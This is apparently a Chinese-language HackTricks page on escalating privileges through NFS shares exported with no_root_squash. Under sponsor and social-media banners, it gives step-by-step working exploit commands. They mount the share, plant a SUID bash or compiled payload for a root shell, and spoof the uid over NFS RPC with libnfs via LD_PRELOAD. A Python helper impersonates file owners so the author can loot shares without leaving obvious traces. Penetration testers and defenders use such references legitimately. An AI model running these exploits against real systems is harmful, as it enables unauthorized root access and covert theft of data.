<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


读取 _ **/etc/exports** _ 文件，如果你找到一些被配置为 **no\_root\_squash** 的目录，那么你可以从 **客户端** 访问它，并且可以像本地 **root** 用户一样在该目录中进行写入操作。

**no\_root\_squash**：此选项基本上允许客户端的 root 用户以 root 身份访问 NFS 服务器上的文件。这可能会导致严重的安全问题。

**no\_all\_squash**：这与 **no\_root\_squash** 选项类似，但适用于 **非 root 用户**。想象一下，你以 nobody 用户的身份获得了一个 shell；检查 /etc/exports 文件；发现 no\_all\_squash 选项存在；检查 /etc/passwd 文件；模拟一个非 root 用户；通过挂载使用 NFS 创建一个以该用户身份的 suid 文件。以 nobody 用户的身份执行 suid 文件，然后成为不同的用户。

# 提权

## 远程利用

如果你发现了这个漏洞，你可以利用它：

* 在客户端机器上**挂载该目录**，并将 **/bin/bash** 二进制文件**复制到**挂载文件夹中，并赋予它**SUID**权限，然后从受害者机器上执行该 bash 二进制文件。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **在客户机上挂载**该目录，并**以root身份将**我们编译好的恶意载荷复制到挂载的文件夹中，该载荷将滥用SUID权限，赋予其**SUID**权限，并从受害者机器上**执行该二进制文件**（你可以在这里找到一些[C SUID载荷](payloads-to-execute.md#c)）。
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## 本地利用

{% hint style="info" %}
请注意，如果您可以从您的计算机创建一个隧道到受害者机器，您仍然可以使用远程版本来利用此特权升级，隧道所需的端口。\
以下技巧是针对 `/etc/exports` 文件中指定了一个 IP 的情况。在这种情况下，您将无法在任何情况下使用远程利用，而需要滥用此技巧。\
此利用工作的另一个要求是 `/etc/export` 中的导出必须使用 `insecure` 标志。\
--_我不确定如果 `/etc/export` 指示了一个 IP 地址，这个技巧是否有效_--
{% endhint %}

**从** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html) **复制的技巧**

现在，假设共享服务器仍然运行 `no_root_squash`，但有些东西阻止我们在渗透测试机器上挂载共享。如果 `/etc/exports` 中有一个明确的 IP 地址列表允许挂载共享，就会发生这种情况。

现在列出的共享只显示允许挂载的机器：
```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```
这意味着我们只能从一个非特权用户在本地利用挂载的共享来进行攻击。但恰巧还有另一个不太为人知的本地漏洞利用方法。

这个漏洞利用依赖于NFSv3规范中的一个问题，该规范要求在访问共享时由客户端来广告其uid/gid。因此，如果共享已经挂载，就有可能通过伪造NFS RPC调用来伪造uid/gid！

这里有一个[允许你做到这一点的库](https://github.com/sahlberg/libnfs)。

### 编译示例 <a href="#compiling-the-example" id="compiling-the-example"></a>

根据你的内核版本，你可能需要调整示例代码。在我的情况下，我需要注释掉fallocate系统调用。
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### 使用库进行利用 <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>

让我们使用最简单的利用方法：
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
将我们的利用工具放在共享目录中，并通过伪造我们的用户ID在RPC调用中使其具有root权限：
```
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
只剩下启动它了：
```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```
我们来了，本地root权限提升！

## 奖励：NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>

一旦在机器上获得本地root权限，我想要掠夺NFS共享，以寻找可能的秘密信息，以便进行进一步渗透。但是由于uid不匹配，尽管我是root用户，我无法读取共享中的许多用户的文件。我不想留下明显的痕迹，比如使用chown -R命令，所以我编写了一个小片段，在运行所需的shell命令之前设置了我的uid：
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
您可以通过在命令前加上脚本名称来正常运行大多数命令：
```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者你想要**获取最新版本的 PEASS 或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向 [hacktricks 仓库](https://github.com/carlospolop/hacktricks) 和 [hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享你的黑客技巧**。

</details>
